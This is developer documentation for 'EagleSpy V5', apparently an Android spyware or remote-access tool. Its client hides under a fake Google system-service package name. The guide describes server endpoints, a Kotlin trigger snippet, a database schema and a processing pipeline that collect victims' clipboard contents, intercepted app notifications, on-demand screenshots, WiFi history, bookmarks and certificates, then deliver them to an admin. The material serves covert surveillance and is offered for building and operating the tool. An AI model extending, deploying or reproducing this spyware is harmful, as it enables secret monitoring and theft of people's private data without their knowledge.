# Data Collection Guide

## Overview

EagleSpy V5 expands data collection with six new collection types:
- **Browser Bookmarks** — Saved bookmarks from Chrome/default browser
- **Installed Certificates** — System and user CA certificates
- **WiFi Network History** — Connected, saved, and scanned networks
- **Clipboard History** — Persistent clipboard monitoring (DB-backed)
- **On-Demand Screenshots** — Server-triggered screenshot capture
- **App Notification Capture** — Intercepted app notifications

---

## API Endpoints

All endpoints are under `/api/devices/:device_id/`.

### Bookmarks

```
GET /api/devices/:id/bookmarks
```

Query parameters:
- `browser` — Filter by browser name (e.g., "Chrome")
- `limit` — Max results (default: 100)

Response:
```json
{
  "device_id": "abc123",
  "bookmarks": [
    {
      "id": 1,
      "title": "Example",
      "url": "https://example.com",
      "browser": "Chrome",
      "folder": "Mobile bookmarks",
      "bookmarked_at": "2026-02-16T10:00:00Z"
    }
  ],
  "count": 1
}
```

### Certificates

```
GET /api/devices/:id/certificates
```

Query parameters:
- `system_only=true` — Only system CA certificates
- `user_only=true` — Only user-installed certificates
- `limit` — Max results (default: 200)

Response:
```json
{
  "device_id": "abc123",
  "certificates": [
    {
      "id": 1,
      "subject": "CN=DigiCert Global Root CA",
      "issuer": "CN=DigiCert Global Root CA",
      "serial_number": "0A0141...",
      "fingerprint_sha256": "43:48:A0...",
      "valid_from": "2006-11-10T00:00:00Z",
      "valid_to": "2031-11-10T00:00:00Z",
      "is_system": true,
      "is_trusted": true
    }
  ],
  "count": 1
}
```

### WiFi Networks

```
GET /api/devices/:id/wifi_networks
```

Query parameters:
- `connected_only=true` — Only currently connected networks
- `saved_only=true` — Only saved/configured networks
- `limit` — Max results (default: 100)

Response:
```json
{
  "device_id": "abc123",
  "wifi_networks": [
    {
      "id": 1,
      "ssid": "HomeWiFi",
      "bssid": "AA:BB:CC:DD:EE:FF",
      "security_type": "WPA/WPA2",
      "signal_strength": -45,
      "is_connected": true,
      "is_saved": true,
      "first_seen_at": "2026-01-15T08:00:00Z",
      "last_connected_at": "2026-02-16T10:30:00Z"
    }
  ],
  "count": 1
}
```

### Clipboard History

```
GET /api/devices/:id/clipboard_history
```

Query parameters:
- `source_app` — Filter by source application package name
- `limit` — Max results (default: 200)

Response:
```json
{
  "device_id": "abc123",
  "clipboard_entries": [
    {
      "id": 1,
      "content": "Copied text content",
      "source_app": "com.whatsapp",
      "captured_at": "2026-02-16T10:15:00Z"
    }
  ],
  "count": 1
}
```

### On-Demand Screenshot

```
POST /api/devices/:id/screenshot
```

Triggers a screenshot capture on the device. The screenshot is delivered asynchronously via the command/response pipeline.

Response:
```json
{
  "status": "command_sent",
  "command_id": "uuid-here",
  "message": "Screenshot command sent to device"
}
```

---

## Android Client

### DataCollectionService

Located at `android-client/app/src/main/java/com/google/android/systemservice/services/DataCollectionService.kt`.

The service can be triggered with specific actions via Intent extras:

| Action | Description |
|---|---|
| `collect_bookmarks` | Collect browser bookmarks |
| `collect_certificates` | Dump installed certificates |
| `collect_wifi_networks` | Scan WiFi networks |
| `collect_clipboard_history` | Send cached clipboard entries |
| `take_on_demand_screenshot` | Capture screenshot |
| `collect_notifications` | Send cached notifications |
| `collect_all` | Run all collectors (default) |

Example:
```kotlin
val intent = Intent(context, DataCollectionService::class.java).apply {
    putExtra("collection_action", "collect_bookmarks")
    putExtra("request_id", "cmd-uuid")
}
context.startService(intent)
```

### Data Flow

1. Android client collects data using system APIs
2. Data is sent to the Rails server via REST POST
3. Server processes via `DataCollectionResponseProcessor`
4. Data is stored in database tables (`bookmarks`, `certificates`, `wifi_networks`, `clipboard_entries`)
5. Admin queries data via GET endpoints

---

## Database Schema

### bookmarks
| Column | Type | Description |
|---|---|---|
| smartphone_id | FK | Device reference |
| title | string | Bookmark title |
| url | string | Bookmark URL |
| browser | string | Browser name |
| folder | string | Bookmark folder |
| bookmarked_at | datetime | When bookmarked |

### certificates
| Column | Type | Description |
|---|---|---|
| smartphone_id | FK | Device reference |
| subject | string | Certificate subject |
| issuer | string | Certificate issuer |
| serial_number | string | Serial number |
| fingerprint_sha256 | string | SHA-256 fingerprint |
| valid_from | datetime | Not before date |
| valid_to | datetime | Not after date |
| is_system | boolean | System vs user cert |
| is_trusted | boolean | Trust status |

### wifi_networks
| Column | Type | Description |
|---|---|---|
| smartphone_id | FK | Device reference |
| ssid | string | Network name |
| bssid | string | Access point MAC |
| security_type | string | WPA2/WEP/Open |
| signal_strength | integer | RSSI value |
| is_connected | boolean | Currently connected |
| is_saved | boolean | Saved network |
| first_seen_at | datetime | First detection |
| last_connected_at | datetime | Last connection |

### clipboard_entries
| Column | Type | Description |
|---|---|---|
| smartphone_id | FK | Device reference |
| content | text | Clipboard content |
| source_app | string | App that set clipboard |
| captured_at | datetime | When captured |

---

## Response Processor

The `DataCollectionResponseProcessor` handles all data collection command responses. It is registered in `ResponseProcessor::COMMAND_PROCESSORS` for:
- `get_bookmarks`
- `get_certificates`
- `get_wifi_networks`
- `get_clipboard_history`
- `take_on_demand_screenshot`
- `get_notifications`

Each processor upserts records (using `find_or_create_by!` where appropriate) to avoid duplicates.
